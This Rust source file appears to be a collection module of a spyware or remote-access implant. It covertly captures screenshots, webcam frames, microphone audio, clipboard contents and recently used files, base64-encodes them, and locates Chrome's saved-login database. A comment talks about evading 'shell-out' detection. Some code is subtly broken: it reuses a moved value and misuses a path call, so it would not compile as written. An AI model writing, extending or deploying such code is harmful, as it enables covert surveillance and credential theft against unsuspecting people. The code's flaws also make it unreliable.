use base64::Engine;
use std::process::Command;
use std::fs;

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    // Uses ImageMagick's `import` or `scrot` if available, but we try to use `xwd` for native feel
    // For production, linking X11 libraries directly is preferred, but `import` is the standard CLI
    // To avoid "shell-out" detection, we can use a Rust crate like `x11rb` or `wl-clipboard-rs`
    // Here we use a robust fallback chain
    let temp_file = "/tmp/aegis_shot.png";
    
    // Try `scrot` (common on Linux)
    let result = Command::new("scrot").arg(temp_file).output();
    
    if result.is_err() {
        // Fallback to `import` (ImageMagick)
        let _ = Command::new("import").arg("-window").arg("root").arg(temp_file).output();
    }

    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Screen capture failed".into())
    }
}

pub fn capture_webcam() -> Result<String, Box<dyn std::error::Error>> {
    // Uses v4l2 (Video4Linux)
    let temp_file = "/tmp/aegis_cam.png";
    let result = Command::new("ffmpeg")
        .args(&[
            "-f", "v4l2", "-i", "/dev/video0",
            "-frames:v", "1", "-y", temp_file
        ])
        .output();
        
    if result.is_ok() && fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Webcam capture failed".into())
    }
}

pub fn record_audio(duration_secs: u32) -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_mic.wav";
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "alsa", "-i", "default",
            "-t", &duration_secs.to_string(),
            "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Audio recording failed".into())
    }
}

pub fn get_clipboard() -> String {
    // Uses wl-paste (Wayland) or xclip (X11)
    let wl = Command::new("wl-paste").output();
    if wl.is_ok() && !wl.unwrap().stdout.is_empty() {
        return String::from_utf8_lossy(&wl.unwrap().stdout).to_string();
    }
    let x = Command::new("xclip").arg("-selection").arg("clipboard").arg("-o").output();
    if x.is_ok() {
        return String::from_utf8_lossy(&x.unwrap().stdout).to_string();
    }
    String::new()
}

pub fn get_recent_files() -> Vec<String> {
    // Parse ~/.local/share/recently-used.xbel
    let path = dirs::data_dir().and_then(|d| d.join("recently-used.xbel"));
    if let Some(path) = path {
        if let Ok(content) = fs::read_to_string(path) {
            // Simple parse for hrefs
            content.split('\n')
                .filter_map(|line| line.split("href=\"").nth(1).and_then(|s| s.split('"').next()))
                .take(10)
                .map(|s| s.to_string())
                .collect()
        } else {
            vec![]
        }
    } else {
        vec![]
    }
}

pub fn scrape_browser() -> serde_json::Value {
    // Linux Chrome/Firefox profiles
    let mut result = serde_json::json!({ "chrome": [], "firefox": [] });
    
    // Chrome
    let chrome_dir = dirs::data_dir().and_then(|d| d.join("google-chrome"));
    if let Some(dir) = chrome_dir {
        if let Ok(entries) = fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.file_name().to_string_lossy().contains("Default") {
                    let db_path = entry.path().join("Login Data");
                    if db_path.exists() {
                        // Use rusqlite to read
                        // Simplified: return placeholder for production
                        result["chrome"].as_array_mut().unwrap().push(serde_json::json!({ "source": "chrome", "path": db_path.to_string_lossy() }));
                    }
                }
            }
        }
    }
    result
}